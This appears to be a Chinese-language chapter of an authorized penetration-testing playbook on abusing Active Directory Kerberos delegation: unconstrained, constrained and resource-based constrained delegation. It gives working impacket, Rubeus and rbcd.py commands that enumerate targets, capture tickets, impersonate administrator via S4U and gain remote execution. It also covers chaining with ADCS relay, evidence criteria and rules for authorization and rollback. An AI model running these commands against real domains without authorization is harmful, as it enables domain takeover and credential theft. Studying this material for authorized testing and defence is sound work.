# 05 委派与 RBCD 深水篇（Delegation / RBCD）

> 范围：已有一个域账号，枚举到 `TRUSTED_FOR_DELEGATION`、`msDS-AllowedToDelegateTo`
> 或对目标计算机对象有写权限，想判断能否换成目标身份的服务票据。
> 前置：域账号、LDAP 只读权限、域对象修改授权；缺任一项先回到 `ad-attacks.md`。
> 一句话：委派是**票据链**问题，不是“属性存在就成功”；每一步都要有票据/服务访问证据。

## 1. 三种委派先分清

| 类型 | 关键属性 | 攻击者需要什么 | 成功证据 |
| :-- | :-- | :-- | :-- |
| Unconstrained | 账号/主机 `TRUSTED_FOR_DELEGATION` | 在该主机上以本地管理员运行；能导出/监控 TGT；诱导高权账号登录 | 高权 TGT/ccache + 访问目标服务 |
| Constrained | `msDS-AllowedToDelegateTo` 含目标 SPN | 对委派账号有控制/可用凭据；目标 SPN 在列表；协议转换可用 | S4U2Self + S4U2Proxy 返回的服务票据 |
| RBCD | 目标计算机对象 `msDS-AllowedToActOnBehalfOfOtherIdentity` 可写 | 一个可控账号（含 SPN）+ 对目标对象的写权限 | 写入成功 + `getST` 服务票据 |

常见误判：把 `TRUSTED_FOR_DELEGATION` 当成“可读域控”；把 `AllowedToDelegateTo` 有值
当成“目标 SPN 一定在列表”；把“能写 RBCD”当成“票据一定签发”。三者都要最后一步票据。

## 2. 只读枚举（先出图再动手）

```bash
export DOMAIN='corp.local' DC='10.0.0.10' USER='alice' PASS='<pass>'
impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
# 或
nxc ldap "$DC" -u "$USER" -p "$PASS" -d "$DOMAIN" \
  --query '(objectClass=user)' \
  --attributes sAMAccountName,userAccountControl,servicePrincipalName,msDS-AllowedToDelegateTo
```

重点字段：

- `userAccountControl` 的 `TRUSTED_FOR_DELEGATION`（0x80000）与
  `TRUSTED_TO_AUTH_FOR_DELEGATION`（0x1000000，协议转换）。
- `msDS-AllowedToDelegateTo`：目标 SPN 列表；为空不是 constrained。
- `msDS-AllowedToActOnBehalfOfOtherIdentity`：RBCD 的安全描述符；能读不等于能写。
- 目标计算机对象的 ACL：`GenericAll`/`GenericWrite`/`WriteDACL`/`WriteOwner`。

RBCD 只读检查（不修改）：

```bash
# 需要 ldap 只读权限；输出只保留 DN 与是否为空
ldapsearch -x -H "ldap://$DC" -D "$USER@$DOMAIN" -w "$PASS" \
  -b "dc=${DOMAIN%%.*},dc=${DOMAIN#*.}" \
  '(objectClass=computer)' dn msDS-AllowedToActOnBehalfOfOtherIdentity
```

判据：DN 能读、属性为空/非空可判定；当前账号对目标对象是否有写权限要另查 ACL
（`dacledit.py`/BloodHound），不能凭“能读属性”推断“能写”。

## 3. Unconstrained：先证明主机可控

```bash
# 在已控主机上（本地管理员），只读确认委派属性
nxc smb <host> -u <local-admin> -p '<pass>' --quser
# 监控/导出票据需要专门工具与授权；示例仅展示判据
Rubeus.exe monitor /interval:5 /nowrap
# 或 Windows 侧导出当前登录会话票据后离线分析（不落明文）
```

成功路径：

1. 目标高权账号登录到该主机（或能被强制认证到该主机）。
2. 攻击者从内存/日志获得 TGT（`.kirbi`/ccache）。
3. 导入 TGT，访问目标服务（`dcsync`/`secretsdump`/文件共享）。

失败判据：

- 没有主机本地管理员 → 无法读 LSA/票据，路径 blocked。
- 有属性但没有高权登录 → 只能等/诱导；不要写“已捕获”。
- TGT 过期或目标已禁用委派 → 重新获取/换目标。

## 4. Constrained：SPN 必须在列表且协议转换可用

```bash
# 只读确认目标 SPN 与协议转换
impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
# 请求服务票据（授权内、低影响目标）
impacket-getST -spn "<target_spn>" -impersonate administrator \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass "$DOMAIN/administrator@<target>"
```

判据：

- `msDS-AllowedToDelegateTo` 包含目标 SPN（精确匹配，含端口/服务类）。
- 若账号没有 `TRUSTED_TO_AUTH_FOR_DELEGATION`，S4U2Self 可能不能为任意用户请求；
  需要协议转换或目标允许。
- `getST` 返回的票据能访问目标服务（`wmiexec`/`smbclient`/HTTP），才算 confirmed。

失败判据：

- `KDC_ERR_BADOPTION`/`STATUS_NO_MATCH`：SPN 不在列表/协议转换受限 → 换目标或转 RBCD。
- 票据拿到但目标拒绝：目标服务未注册 SPN/防火墙/服务账号权限不足 → 不是委派成功。
- 反复 `getST` 会刷 4769；控制频率。

## 5. RBCD：写权限 + 可控账号 + 目标计算机

RBCD 的本质是让目标计算机“信任”攻击者控制的账号来代表任意用户。需要：

1. 一个可控账号（最好有 SPN；没有 SPN 可用机器账号/`addcomputer` 创建）。
2. 对目标计算机对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 有写权限
   （`GenericWrite`/`GenericAll`/`WriteDACL`）。
3. 目标计算机允许协议转换/S4U2Proxy；时钟同步。

只读检查 + 写入（写入必须单独授权并登记回滚）：

```bash
# 只读：看目标对象 ACL 与现有 RBCD 值
dacledit.py -action read -target '<target>' "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
# 写入（示例，需授权；先备份原值）
rbcd.py -delegate-from '<controlled-account>' -delegate-to '<target>$' \
  -action write "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
# 请求票据
impacket-getST -spn 'cifs/<target>' -impersonate administrator \
  "$DOMAIN/<controlled-account>:$PASS" -dc-ip "$DC"
```

判据：

- 写入返回成功，且回读属性包含可控账号 SID。
- `getST` 返回服务票据，且能访问目标 `cifs`/`http`/`wmi`。
- 结束后清理 RBCD 属性并记录原值；不清理会留下持久化后门。

失败判据：

- 写返回 `ACCESS_DENIED`：ACL 不足，转 ACL 滥用或换目标。
- 写入成功但 `getST` 失败：目标禁用协议转换/票据未生效/时钟偏移 → 查目标属性与时间。
- 可控账号没有 SPN：S4U2Self 可能失败；先补 SPN 或换机器账号。
- 目标已有 RBCD 值：不要覆盖，先备份；覆盖可能破坏业务信任关系。

## 6. 委派与 ADCS/relay 的组合

| 组合 | 何时用 | 关键判据 | 常见失败 |
| :-- | :-- | :-- | :-- |
| 委派 + ADCS ESC1 | 有可注册模板，但拿不到高权口令 | pfx + `certipy auth` 出 TGT | 模板需审批/无 Enroll |
| 委派 + ESC8 relay | 有 CA HTTP 端点、目标可强制认证 | relay 收到证书并 `auth` 成功 | EPA/signing 已开 |
| RBCD + 强制认证 | 对目标计算机有写权限 | 写入 RBCD + S4U2Proxy 票据 | 目标禁用协议转换 |
| Unconstrained + 强制认证 | 有可控主机且能诱导高权登录 | 捕获 TGT + 访问服务 | 无高权登录/主机不可控 |

顺序建议：先做**只读枚举**（委派属性、ACL、模板、CA flag），再选一条最便宜的路；
不要同时开 relay、roast、RBCD 三条高噪音路径。

## 7. 证据与报告模板

```text
路径：Constrained delegation
账号：<account>（指纹）
目标 SPN：<spn>
属性：msDS-AllowedToDelegateTo 包含目标（是/否）；协议转换（是/否）
命令：impacket-getST ...（rc=0）
票据：类型/有效期/指纹（不落明文）
访问：wmiexec 返回 whoami=<target>\administrator（时间）
结论：confirmed / candidate / blocked
清理：无（只读）/ 已回滚 RBCD（原值指纹）
```

## 8. 失败判据

- 只有委派属性，没有服务票据/目标访问 → `candidate`，不是打穿。
- SPN 不匹配、协议转换受限、目标禁用委派 → 当前路径 blocked，换目标/RBCD/ADCS。
- RBCD 写入失败或目标已有值 → 不覆盖，转 ACL/其他目标。
- 票据拿到但目标拒绝 → 查服务注册/权限/防火墙，不要重复请求。
- 时钟偏移/票据过期 → 先对时/重取，再判断路径。

## 9. 边界

- 只枚举授权域内的对象；OU/计算机/模板修改按授权单执行。
- RBCD/ACL/模板修改属于高风险写操作：先备份、单独授权、登记回滚与清理。
- 不默认持久化；委派票据/证书只用于本次授权验证，不长期保留。
- 票据、证书、hash、口令只留指纹；报告不出现明文。
- 强制认证/relay 只在授权清单内执行；这类动作可能影响业务与触发高保真告警。
